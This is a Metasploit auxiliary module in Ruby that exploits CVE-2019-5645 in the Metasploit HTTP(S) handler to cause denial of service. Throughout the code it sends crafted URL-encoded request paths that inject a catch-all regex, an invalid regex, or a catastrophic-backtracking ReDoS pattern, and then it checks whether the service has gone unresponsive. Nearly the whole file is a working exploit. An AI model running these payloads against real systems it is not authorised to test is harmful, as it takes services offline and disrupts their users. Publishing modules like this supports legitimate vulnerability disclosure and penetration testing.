##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Metasploit HTTP(S) handler DoS',
                      'Description' => %q{
        This module exploits the Metasploit HTTP(S) handler by sending
        a specially crafted HTTP request that gets added as a resource handler.
        Resources (which come from the external connections) are evaluated as RegEx
        in the handler server. Specially crafted input can trigger Gentle, Soft and Hard DoS.

        GENTLE: *Current sessions will continue to work, but not future ones*
        A lack of input sanitation permits an attacker to submit a
        request that will be added to the resources and will be used as regex rule
        it is possible then to make a valid regex rule that captures all the new handler
        requests. The sessions that were established previously will continue to work.

        SOFT: *No past or future sessions will work*
        A lack of input sanitation and lack of exception handling causes
        metasploit to behave abnormally when looking an appropriate resource for the
        request, by submitting an invalid regex as a resource. This means that no request,
        current or future will get served an answer.

        HARD: *ReDOS or Catastrophic Regex Backtracking*
        A lack of input sanitization on paths added as resources allows
        an attacker to execute a catastrophic regex backtracking operation
        causing a Denial of Service by CPU consumption.

        Tested against:

        Metasploit 5.0.20
      },
                      'Author' => [
                          'Jose Garduno, Dreamlab Technologies AG', #Vulnerability Discovery, Metasploit module.
                          'Angelo Seiler, Dreamlab Technologies AG', #Additional research, debugging.
                      ],
                      'License' => MSF_LICENSE,
                      'References' => [
                          ['CVE', '2019-5645']
                      ],
                      'DisclosureDate' => '2019-09-04'
          ))

    register_options(
        [
            OptString.new('DOSTYPE', [true, 'GENTLE|SOFT|HARD', 'HARD'])
        ])
  end

  def test_service_unresponsive
    begin
      print_status('Testing for service unresponsiveness.')

      res = send_request_cgi({
                                 'uri' => '/' + Rex::Text.rand_text_alpha(8),
                                 'method' => 'GET'
                             })

      if res.nil?
        print_good('SUCCESS, Service not responding.')
      else
        print_error('Service responded with a valid HTTP Response; Attack failed.')
      end
    rescue ::Rex::ConnectionRefused
      print_error('An unknown error occurred.')
    rescue ::Timeout::Error
      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')
    end
  end


  def dos
    case datastore['DOSTYPE']
    when "HARD"
      resone = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/%2f%26%28%21%7c%23%2b%29%2b%40%32%30")
      )
      begin
        restwo = send_request_cgi(
            'method' => 'GET',
            'uri' => normalize_uri("/%26%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%21")
        )
      rescue ::Errno::EPIPE, ::Timeout::Error
        # Same exceptions the HttpClient mixin catches
      end
      test_service_unresponsive

    when "SOFT"
      resone = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/%5b20")
      )

      test_service_unresponsive

    when "GENTLE"
      resone = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/%2e%2a%7c%32%30%7c%5c")
      )

      sleep(1)

      restwo = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/whatever")
      )

      resthree = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/whatever2")
      )

      if resthree.body.length == 0
        print_good('SUCCESS, Service not responding.')
      else
        print_error('Service responded with a valid HTTP Response; Attack failed.')
      end

    else
      bla = ""
    end

    print_status("DOS request sent")
  end

  def is_alive?
    begin
      connect
    rescue Rex::ConnectionRefused
      return false
    ensure
      disconnect
    end
    true
  end

  def run
    print_status("#{rhost}:#{rport} - Sending DoS packet...")
    dos

  end

end
